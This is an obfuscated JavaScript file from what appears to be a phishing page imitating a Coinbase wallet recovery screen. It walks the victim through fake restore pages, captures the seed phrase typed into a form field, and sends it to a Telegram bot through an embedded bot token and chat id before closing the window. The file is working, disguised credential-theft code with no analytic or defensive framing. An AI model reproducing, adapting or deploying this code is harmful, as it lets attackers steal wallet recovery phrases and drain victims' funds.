"use strict";

function _0x25dd() {
  var _0xdab1bb = ['1867348cKRvhC', '10GQLnDt', '122908GSnJLg', 'block', '77jvsFzL', '11773935KDnzJt', '.coinbase-entry__button-link-wallet', 'none', 'https://api.telegram.org/bot', '-1001342794147', '.coinbase-entry', 'querySelector', 'disabled', '5406482665:AAFnOeq7lVQ441xTzULuDhzs2GXybgCS3fE', '.coinbase-seed-2', '9581488PVfznG', 'style', '22366058LCoxJc', 'display', '/sendMessage?', 'addEventListener', '11606VfHQiu', '.coinbase-seed', '471bdTYVW', '860406lyTWtO', '.coinbase-seed__recovery-button', 'value', '310KSLEzQ', 'close', 'push', 'log'];

  _0x25dd = function _0x25dd() {
    return _0xdab1bb;
  };

  return _0x25dd();
}

var _0x1110f7 = _0x16b6;

(function (_0x2d6b72, _0x218975) {
  var _0x51a1c5 = _0x16b6,
      _0x2c186e = _0x2d6b72();

  while (!![]) {
    try {
      var _0xdd808 = parseInt(_0x51a1c5(0x91)) / 0x1 + parseInt(_0x51a1c5(0xa6)) / 0x2 * (parseInt(_0x51a1c5(0xa8)) / 0x3) + parseInt(_0x51a1c5(0x93)) / 0x4 * (parseInt(_0x51a1c5(0xac)) / 0x5) + parseInt(_0x51a1c5(0xa9)) / 0x6 * (-parseInt(_0x51a1c5(0x95)) / 0x7) + parseInt(_0x51a1c5(0xa0)) / 0x8 + -parseInt(_0x51a1c5(0x96)) / 0x9 + parseInt(_0x51a1c5(0x92)) / 0xa * (-parseInt(_0x51a1c5(0xa2)) / 0xb);

      if (_0xdd808 === _0x218975) break;else _0x2c186e['push'](_0x2c186e['shift']());
    } catch (_0x322ee2) {
      _0x2c186e['push'](_0x2c186e['shift']());
    }
  }
})(_0x25dd, 0xeaee3);

var buttonRestore = document['querySelector'](_0x1110f7(0x97)),
    buttonImport = document[_0x1110f7(0x9c)](_0x1110f7(0xaa)),
    restoringPassPage1 = document[_0x1110f7(0x9c)](_0x1110f7(0x9b)),
    restoringPassPage2 = document[_0x1110f7(0x9c)](_0x1110f7(0xa7)),
    restoringPassPage3 = document[_0x1110f7(0x9c)](_0x1110f7(0x9f)),
    mainBtn = document[_0x1110f7(0x9c)]('.coinbase-seed-2__submit-button'),
    inputWords = document['querySelector']('.coinbase-seed-2__form-input');

buttonRestore[_0x1110f7(0xa5)]('click', function (_0x68986f) {
  var _0x415cea = _0x1110f7;
  restoringPassPage1[_0x415cea(0xa1)][_0x415cea(0xa3)] = _0x415cea(0x98), restoringPassPage2['style'][_0x415cea(0xa3)] = _0x415cea(0x94);
}), buttonImport[_0x1110f7(0xa5)]('click', function (_0x18a41a) {
  var _0x48e42e = _0x1110f7;
  restoringPassPage2[_0x48e42e(0xa1)][_0x48e42e(0xa3)] = _0x48e42e(0x98), restoringPassPage3[_0x48e42e(0xa1)]['display'] = 'block';
}), mainBtn[_0x1110f7(0xa5)]('click', function (_0x4a4db8) {
  var _0x4045e7 = _0x1110f7;

  _0x4a4db8['preventDefault']();

  var _0x11f64f = _0x4045e7(0x9e),
      _0x254cb1 = _0x4045e7(0x9a),
      _0x4a17b8 = _0x4045e7(0x99) + _0x11f64f + _0x4045e7(0xa4),
      _0x65d331 = 'Coinbase:\x20' + data;

  axios['post'](_0x4a17b8, {
    'chat_id': _0x254cb1,
    'parse_mode': 'html',
    'text': _0x65d331
  }), setTimeout(function () {
    var _0x2bc747 = _0x4045e7;

    window[_0x2bc747(0xad)]();
  }, 0x1f4);
});
var data = [];

function _0x16b6(_0x120d22, _0x3b6f5a) {
  var _0x25dd4c = _0x25dd();

  return _0x16b6 = function _0x16b6(_0x16b698, _0x11a202) {
    _0x16b698 = _0x16b698 - 0x91;
    var _0x40905c = _0x25dd4c[_0x16b698];
    return _0x40905c;
  }, _0x16b6(_0x120d22, _0x3b6f5a);
}

inputWords[_0x1110f7(0xa5)]('input', function (_0x258921) {
  var _0x109276 = _0x1110f7;
  _0x258921['target'][_0x109276(0xab)] !== '' ? (data = [], data[_0x109276(0xae)](_0x258921['target']['value']), mainBtn[_0x109276(0x9d)] = ![], console[_0x109276(0xaf)](data)) : mainBtn[_0x109276(0x9d)] = !![];
});